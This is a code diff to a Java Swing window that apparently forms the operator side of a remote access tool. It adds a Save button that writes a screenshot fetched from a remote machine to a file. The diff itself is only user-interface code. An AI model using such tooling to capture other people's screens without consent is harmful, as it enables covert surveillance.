@@ -28,6 +28,7 @@ public class Screen extends javax.swing.JFrame {
     }
     
     public static String IP;
+    public static BufferedImage img;
 
     /**
      * This method is called from within the constructor to initialize the form.
@@ -40,7 +41,7 @@ public class Screen extends javax.swing.JFrame {
 
         BackBtn = new javax.swing.JButton();
         jLabel1 = new javax.swing.JLabel();
-        jButton1 = new javax.swing.JButton();
+        SaveBtn = new javax.swing.JButton();
         ShotBtn = new javax.swing.JButton();
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
@@ -63,7 +64,12 @@ public class Screen extends javax.swing.JFrame {
             }
         });
 
-        jButton1.setText("Save");
+        SaveBtn.setText("Save");
+        SaveBtn.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                SaveBtnActionPerformed(evt);
+            }
+        });
 
         ShotBtn.setText("Shot");
         ShotBtn.addActionListener(new java.awt.event.ActionListener() {
@@ -80,7 +86,7 @@ public class Screen extends javax.swing.JFrame {
                 .addContainerGap()
                 .addComponent(ShotBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 90, javax.swing.GroupLayout.PREFERRED_SIZE)
                 .addGap(18, 18, 18)
-                .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 91, javax.swing.GroupLayout.PREFERRED_SIZE)
+                .addComponent(SaveBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 91, javax.swing.GroupLayout.PREFERRED_SIZE)
                 .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 316, Short.MAX_VALUE)
                 .addComponent(BackBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 87, javax.swing.GroupLayout.PREFERRED_SIZE)
                 .addContainerGap())
@@ -94,7 +100,7 @@ public class Screen extends javax.swing.JFrame {
                 .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                     .addComponent(ShotBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 30, javax.swing.GroupLayout.PREFERRED_SIZE)
                     .addComponent(BackBtn, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
-                    .addComponent(jButton1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
+                    .addComponent(SaveBtn, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                 .addContainerGap())
         );
 
@@ -116,7 +122,7 @@ public class Screen extends javax.swing.JFrame {
             if(res.equals("ok")) {
                 RATClientCtr.getPic();
                 File file = new File("screen.jpg");
-                BufferedImage img = ImageIO.read(file);
+                img = ImageIO.read(file);
                 file.delete();
                 Image img2 = img.getScaledInstance(jLabel1.getWidth(),jLabel1.getHeight(),Image.SCALE_SMOOTH);
                 jLabel1.setIcon(new ImageIcon(img2));
@@ -133,6 +139,16 @@ public class Screen extends javax.swing.JFrame {
     private void jLabel1AncestorAdded(javax.swing.event.AncestorEvent evt) {//GEN-FIRST:event_jLabel1AncestorAdded
         // TODO add your handling code here:
     }//GEN-LAST:event_jLabel1AncestorAdded
+
+    private void SaveBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_SaveBtnActionPerformed
+        // TODO add your handling code here:
+        try {
+            ImageIO.write(img, "jpg", new File("screen.jpg"));
+            JOptionPane.showMessageDialog(rootPane, "Success!");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }//GEN-LAST:event_SaveBtnActionPerformed
 
     /**
      * @param args the command line arguments
@@ -186,8 +202,8 @@ public class Screen extends javax.swing.JFrame {
 
     // Variables declaration - do not modify//GEN-BEGIN:variables
     private javax.swing.JButton BackBtn;
+    private javax.swing.JButton SaveBtn;
     private javax.swing.JButton ShotBtn;
-    private javax.swing.JButton jButton1;
     private javax.swing.JLabel jLabel1;
     // End of variables declaration//GEN-END:variables
 }
